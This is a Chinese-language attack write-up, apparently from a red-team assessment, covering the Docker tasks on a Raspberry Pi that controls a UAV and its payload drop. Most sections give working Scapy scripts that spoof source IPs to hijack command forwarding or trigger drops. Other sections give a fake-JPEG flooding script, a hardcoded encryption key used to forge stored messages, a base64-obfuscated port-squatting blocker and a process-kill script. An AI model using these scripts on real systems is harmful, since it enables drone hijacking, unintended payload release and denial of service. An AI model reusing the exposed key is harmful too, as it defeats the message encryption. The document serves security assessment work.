# keti4 - attack

## start_docker.py @ raspberry 本机

### 控制流分析

本文件位于树莓派本机上, 用于启动5个任务

当`start_docker.py`开始运行后, 建立套接字监听本机`14560`端口, 接受来自任意`ip(0.0.0.0)`的`UDP`连接

当任意设备uav连接时,记录该设备`ip`和`port`作为`uavAddr`和`uavPort`

然后异步启动线程`docker1`, 实际上就是异步执行了shell命令

```
docker exec task1 python serveUdp2.py 8715 $uavAddr $uavPort
```

`start_docker.py`的连接只会发生一次, 完事之后出循环

```py
    while True:
        print('\nWaiting to receive message')
        data, address = server_socket.recvfrom(4096)
        print(f"\nReceived {len(data)} bytes from {address}")

        # 检查是否需要更新 UAV 地址和端口
        if int(uavPort) != int(address[1]):
            uavPort = address[1]
            uavAddr = address[0]
            # 启动docker1:指令转发
            docker_thread1 = threading.Thread(target=docker1, args=("task1", uavAddr, uavPort))
            docker_thread1.start()

        if int(uavPort) == int(address[1]):
            break
    server_socket.close()
```

接下来依次启动剩余四个`task`

### 攻击面

`start_docker.py`的`main`中监听的连接可以是任意`ip`

```c
server_address = ('0.0.0.0', 14560)
```

这意味着同网段任意设备均可以向该socket发起UDP通信, 

并且考虑到`start_docker.py`中会以该连接中对方的ip和port, 来指导task1转发指令的目的地

此攻击也会影响到task1



攻击者位置: 同网段第三台设备

攻击时刻: 在`start_docker.py`启动之后, 在收到UDP报文之前, 攻击者先发制人

攻击脚本:

```py
from scapy.all import *
src = '192.168.1.103'		#可以是任意地址, 隐藏攻击者的真实ip
dst = '192.168.1.102'		#假设树莓派在这里
sport = 11451
dport = 14560				#start_docker监听的端口

packet =  IP(src=src,dst=dst)/UDP(sport=sport,dport=dport)/"Hello,world!"
packet.show()
send(packet)
```

效果是隐藏攻击者自己的身份, 构造假的IP/UDP报文, 

从一个假地址`192.168.1.103:11451`发起攻击, 目标是`server_docker.py @ 192.168.1.102:14560`



## task1 

`task1`由`start_docker.py`启动, 实际上就是异步执行了下述 `shell`命令

```
docker exec task1 python serveUdp2.py 8715 $uavAddr $uavPort
```

==1.如果攻击者已经对`start_docker.py`发起了攻击==,那么此时`uavAddr`和`uavPort`是攻击者指定的假地址`192.168.1.103:11451`

那么此时转发指令的目的地, 就是假地址`192.168.1.103:11451` ,那么课题4预期的设备将永远不会接收到转发的消息





==2.如果攻击者没有对`start_docker.py`发动攻击==, 那么此时`uavAddr`和`uavPort`此时是课题4预期的设备

然而`sendMsg @ serveUdp2.py`中, 仍然是允许来自任意ip(0.0.0.0)的设备连接, 攻击面类似于针对`start_docker.py`中的攻击

```py
from scapy.all import *
src = '192.168.1.105'			#可以是任意地址, 隐藏攻击者的真实ip
dst = '192.168.1.102'			#树莓派ip
sport = 11451
dport = 8715					#task1使用的端口

packet =  IP(src=src,dst=dst)/UDP(sport=sport,dport=dport)/"Hello,world!"
packet.show()
send(packet)
```



## task2

`task2 `还是会监听本机的`14560`端口, 接受任意`ip`的`UDP`报文, 然后转发给地面站`('192.168.10.201', 8713)` ,并加密抄送到本地9973端口

攻击面照旧

```python
from scapy.all import *
src = '192.168.1.103'		#可以是任意地址, 隐藏攻击者的真实ip
dst = '192.168.1.102'		#假设树莓派在这里
sport = 11451
dport = 14560				#start_docker监听的端口

packet =  IP(src=src,dst=dst)/UDP(sport=sport,dport=dport)/"Hello,world!"
packet.show()
send(packet)
```

## task3

1.`task3`监听本机`8716`端口, 接受任意`ip`的`UDP`报文,

在循环中一直监听接受报文, 只要收到就抛投

攻击`main`照旧

```python
from scapy.all import *
src = '192.168.1.103'		#可以是任意地址, 隐藏攻击者的真实ip
dst = '192.168.1.102'		#假设树莓派在这里
sport = 11451
dport = 8716				#start_docker监听的端口

packet =  IP(src=src,dst=dst)/UDP(sport=sport,dport=dport)/"Hello,world!"
packet.show()
send(packet)
```



2.考虑到抛投任务实际上是向GPIO的外设发送PWN信号

这个外设是映射给容器`task3`的, 该设备在树莓派本机也可见, 如果配置不当, 在其他容器中也可能可见

因此攻击者可以在树莓派本机上直接触发抛投任务



攻击可直接在树莓派本机上直接执行`paotou.py`

又有没有拿到实物, 并且task3不能正确启动, 攻击组无法给出具体方案

## task4



```c
image_paths = [os.path.join(folder_path, file) for file in os.listdir(folder_path) if file.lower().endswith(image_extensions)]
```

实际上是指

```c
/home/pi/image_classification/*.jpg
/home/pi/image_classification/*.png
/home/pi/image_classification/*.jpeg
/home/pi/image_classification/*.bmp
/home/pi/image_classification/*.tiff
```

 **假设攻击者现在已经拿到了task4的shell**

那么可以在`/home/pi/image_classification/`下创建大量假图片文件, 在`classify.py`获取图片是造成大量IO浪费时间

可以使用下述脚本

```sh
#!/bin/bash
if [ "$#" -lt 2 ]; then
    echo "error: insufficient arguments"
    echo "usage: "
    echo "./fake_image.sh <path> <count>"
    echo "generate <count> fake images in <path>"
    exit 1
fi

jpeg_header="\xFF\xD8\xFF\xE0\x00\x10J\x46\x49\x46\x00\x01\x01\x00\x60\x00\x60\x00\x00\xFF\xDB\x00\x43\x00\x02\x01\x01\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x00\x00\x00\xFF\xC0\x11\x08\x00\x00\x00\x01\x00\x03\x00\x01\x01\x01\x00\xFF\xC4\x1E\x00\x00\x01\x05\x01\x01\x01\x00\x00\x00\x00\x00\xFF\xC4\x1F\x00\x00\x01\x01\x01\x01\x00\x00\x00\x00\x00\xFF\xDA\x00\x0C\x03\x01\x00\x00\x00\x00\x00\xFF\xD9"

path=$1
count=$2
if [[ "${path: -1}" != "/" ]]; then
    path="${path}/" 
fi
echo $path
for i in $(seq 1 $count); do
    echo -e ${jpeg_header} > "${path}${RANDOM}.jpg"
done

```

```sh
┌──(root㉿Destroyer)-[/home/pi/image_classification]
└─# ls
10.jpg  11337.jpg  14468.jpg  16877.jpg  5901.jpg

┌──(root㉿Destroyer)-[/home/pi/image_classification]
└─# xxd 10.jpg
00000000: ffd8 ffe0 0010 4a46 4946 0001 0100 6000  ......JFIF....`.
00000010: 6000 00ff db00 4300 0201 0102 0202 0202  `.....C.........
00000020: 0202 0202 0202 0202 0202 0202 0202 0202  ................
00000030: 0202 0202 0202 0202 0202 0202 0202 0000  ................
00000040: 00ff c011 0800 0000 0100 0300 0101 0100  ................
00000050: ffc4 1e00 0001 0501 0101 0000 0000 00ff  ................
00000060: c41f 0000 0101 0101 0000 0000 00ff da00  ................
00000070: 0c03 0100 0000 0000 ffd9 0a              ...........

┌──(root㉿Destroyer)-[/home/pi/image_classification]
└─# file 10.jpg
10.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 24576x24576, segment length 16
```

如此生成的图片均为标准的`jpeg`格式图片, 可以绕过模型对jpeg格式的检查



同样的道理, 可以对该目录下的真实图片进行污染或者删除等操作

这里不再给出脚本

## task5

`task5`监听本机`9973`端口, 接受任意`ip`连接

收到`udp`报文后提取其中数据, 使用`key`加密后存入本地文件`ecv_msg.txt`

这里的加密是对称加密, `task2`中使用同样的`key`

```c
wldiPvKR6pNBrAWS_nXbszK_MnOx_Q4NKxcYH3eN5Os=
```

经过验证, 如果朝task5发送不经key加密的报文, 在解密时会发生错误, 因此攻击者也需要有该密钥

假设攻击者持有该密钥, 可以在任意ip向task5发送任意报文, 污染`ecv_msg.txt`

```python
from scapy.all import *
from cryptography.fernet import Fernet
src = '192.168.1.105'
dst = '127.0.0.1'				#受害者ip
sport = 11451
dport = 9973					#受害者task5 使用端口

data = "Hello,world!"           #此处发送任意消息


key = b"wldiPvKR6pNBrAWS_nXbszK_MnOx_Q4NKxcYH3eN5Os="
cipher_suite = Fernet(key)
msg = data.encode("utf-8")
enc_msg = cipher_suite.encrypt(msg)


packet =  IP(src=src,dst=dst)/UDP(sport=sport,dport=dport)/enc_msg
packet.show()
send(packet)
```



受害者视角:

```python
┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/keti4/task5]
└─# python3 ./computing_storing.py 
Listening on 0.0.0.0:9973...
:100 bytes (gAAAAABnB5xNvdB3Wzqq5ENXu2qLkS9t6zRN9_ulRSZKrQUlpmtkhJ_rclosr_9HhDwA7wFlctUYKdbidaGjeQ0X4vV6Tl6Sxg==) from ('192.168.1.105', 11451)
:12 bytes (Hello,world!) from ('192.168.1.105', 11451)
```

‘Hello,world!’字样被成功解码并存入了本地文件

这里发送方的地址和端口也是攻击者伪造的



## task1-task3 & task5

阻塞任务端口(block_port.sh <port>)

```shell
#!/bin/bash

if [ "$#" -lt 1 ]; then
    echo "error: insufficient arguments"
    echo "usage: "
    echo "./block_port.sh <port>"
    exit 1
fi

trap "rm ./block.py -f" SIGINT

encodeCmd="aW1wb3J0IHNvY2tldApkZWYgYmxvY2tfdWRwX3BvcnQocG9ydCk6CiAgICBzZXJ2ZXJfc29ja2V0ID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfREdSQU0pCiAgICBzZXJ2ZXJfc29ja2V0LnNldHNvY2tvcHQoc29ja2V0LlNPTF9TT0NLRVQsIHNvY2tldC5TT19SRVVTRUFERFIsIDEpCiAgICB0cnk6CiAgICAgICAgc2VydmVyX3NvY2tldC5iaW5kKCgiMC4wLjAuMCIsIHBvcnQpKQogICAgICAgIHByaW50KGYiWytdVURQIFBvcnQge3BvcnR9IGlzIG5vdyBibG9ja2VkIikKICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICBkYXRhLCBhZGRyID0gc2VydmVyX3NvY2tldC5yZWN2ZnJvbSgxMDI0KQogICAgICAgICAgICBwcmludChmIlsrXUNvbm5lY3Rpb24gYXR0ZW1wdCBmcm9tIHthZGRyfSBibG9ja2VkIHdpdGggZGF0YToge2RhdGF9IikKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIlstXUZhaWxlZCB0byBiaW5kIHRvIFVEUCBwb3J0IHtwb3J0fToge2V9IikKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIGJsb2NrX3VkcF9wb3J0KGZsNGcp"
echo $encodeCmd | base64 -d > block.py

port=$1
sed -i "s/fl4g/$port/g" ./block.py
chmod +x block.py

python3 block.py

```



## task1-task3 & task5

杀死任务进程(kill_task.sh <pid>)

```shell
#!/bin/bash
if [ "$#" -lt 1 ]; then
    echo "error: insufficient arguments"
    echo "usage: "
    echo "./kill_task.sh <pid>"
    exit 1
fi

kill -9 $1
```

